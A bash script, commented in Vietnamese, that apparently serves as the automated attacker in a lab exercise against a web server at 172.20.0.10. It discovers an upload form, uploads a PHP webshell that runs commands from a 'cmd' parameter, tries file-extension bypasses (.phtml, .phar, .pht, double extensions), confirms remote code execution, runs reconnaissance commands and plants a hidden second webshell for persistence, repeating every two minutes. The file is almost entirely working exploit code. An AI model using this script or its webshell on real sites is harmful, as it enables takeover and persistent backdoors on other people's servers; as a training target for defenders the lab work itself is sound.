#!/bin/bash
# =============================================================================
# Attacker TU DONG - tan cong UPLOAD WEBSHELL -> RCE vao he A (172.20.0.10).
# Kill-chain THUC TE: moi vong chay LAI tu dau (recon -> dis -> probe -> bypass
# -> verify -> exploit -> persistence). KHONG hardcode: tu parse form, tu thu
# cac bien the duoi file, chi giu cai server CHAP NHAN va THUC THI duoc.
# -> Khi SV va dung (allowlist / tat PHP o uploads) thi moi upload .phtml bi tu
#    choi hoac khong thuc thi => attacker TU FAIL (khong can if-patched).
# =============================================================================
T="http://172.20.0.10"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
log(){ echo "[$(date +%H:%M:%S)] $*"; }

# Payload webshell: chay lenh qua tham so ?cmd=
SHELL_SRC='<?php if(isset($_REQUEST["cmd"])){echo "<pre>";system($_REQUEST["cmd"]);echo "</pre>";} ?>'

wait_up(){
  for i in $(seq 1 120); do
    curl -s -m 4 -o /dev/null "$T/" 2>/dev/null && return 0
    sleep 3
  done
  return 1
}

# Parse trang chu de tim action + ten field file (fallback upload.php / avatar)
discover(){
  local page action field
  page=$(curl -s -m 6 -A "$UA" "$T/" 2>/dev/null)
  action=$(printf '%s' "$page" | grep -oiE "action=[\"']?[a-z0-9_./-]+" | head -1 | sed -E "s/action=[\"']?//I")
  field=$(printf '%s' "$page" | grep -oiE "type=[\"']?file[\"']?[^>]*name=[\"']?[a-z0-9_]+|name=[\"']?[a-z0-9_]+[\"']?[^>]*type=[\"']?file" \
          | grep -oiE "name=[\"']?[a-z0-9_]+" | head -1 | sed -E "s/name=[\"']?//I")
  [ -z "$action" ] && action="upload.php"
  [ -z "$field" ]  && field="avatar"
  ACTION="$action"; FIELD="$field"
}

# up <fname> <ctype> <localfile> -> in body phan hoi
up(){ curl -s -m 8 -A "$UA" -F "${FIELD}=@${3};type=${2};filename=${1}" "$T/$ACTION" 2>/dev/null; }

# Lay duong dan uploads/<...> tu phan hoi (neu app in ra), else doan theo ten
saved_path(){ printf '%s' "$1" | grep -oE "uploads/[A-Za-z0-9_.-]+" | head -1; }

# Kiem RCE: goi file, truyen marker, xem co chay khong
verify_rce(){ # $1 = path uploads/xxx ; $2 = marker
  curl -s -m 8 -A "$UA" "$T/$1?cmd=echo%20$2" 2>/dev/null | grep -q "$2"
}

attack_once(){
  discover
  log "recon: action=$ACTION field=$FIELD"

  # --- baseline: upload file "anh" hop le de biet noi luu ---
  echo "hello" > /tmp/t.jpg
  R=$(up "avatar.jpg" "image/jpeg" /tmp/t.jpg)
  BP=$(saved_path "$R"); log "baseline jpg -> ${BP:-?}"

  # --- thu .php thang (du bi chan) ---
  printf '%s' "$SHELL_SRC" > /tmp/s.php
  R=$(up "shell.php" "image/jpeg" /tmp/s.php)
  if printf '%s' "$R" | grep -qiE "BLOCK_PHP|tu choi|403"; then log "shell.php -> BI CHAN (nhu mong doi)"; fi

  # --- thu double-ext .php.jpg (thuong upload OK nhung KHONG thuc thi -> loai) ---
  R=$(up "shell.php.jpg" "image/jpeg" /tmp/s.php)
  P=$(saved_path "$R")
  if [ -n "$P" ] && verify_rce "$P" "DXMARK$$"; then
    log "double-ext RCE (hiem)"; RCE_PATH="$P"; return 0
  fi

  # --- bypass chinh: .phtml (va vai bien the) -> upload + verify RCE ---
  local n; n="av_$(date +%s)_$RANDOM"
  for ext in phtml phar pht; do
    R=$(up "${n}.${ext}" "image/jpeg" /tmp/s.php)
    P=$(saved_path "$R")
    [ -z "$P" ] && P="uploads/${n}.${ext}"   # doan neu app khong in path
    if verify_rce "$P" "RCE${RANDOM}OK"; then
      log "BYPASS .$ext THANH CONG -> RCE tai $P"
      RCE_PATH="$P"; return 0
    fi
  done
  log "khong upload duoc webshell thuc thi (co the he A da duoc VA)"
  return 1
}

post_exploit(){
  local M="PWNED_$RANDOM"
  log "post-exploit: $(curl -s -m 8 -A "$UA" "$T/$RCE_PATH?cmd=id;whoami;echo%20$M" 2>/dev/null | tr -d '\n' | tail -c 200)"
  # persistence: ha shell tang 2 ten AN (dotfile) bang chinh webshell (www-data ghi vao uploads)
  local b=".sys_$(date +%s).phtml"
  curl -s -m 8 -A "$UA" --data-urlencode "cmd=printf '%s' '$SHELL_SRC' > /var/www/html/uploads/$b" "$T/$RCE_PATH" >/dev/null 2>&1
  log "persistence: tha $b"
}

log "=== attacker start -> $T ==="
wait_up || { log "target khong len"; }
while true; do
  RCE_PATH=""
  if attack_once && [ -n "$RCE_PATH" ]; then
    post_exploit
  fi
  sleep 120
done
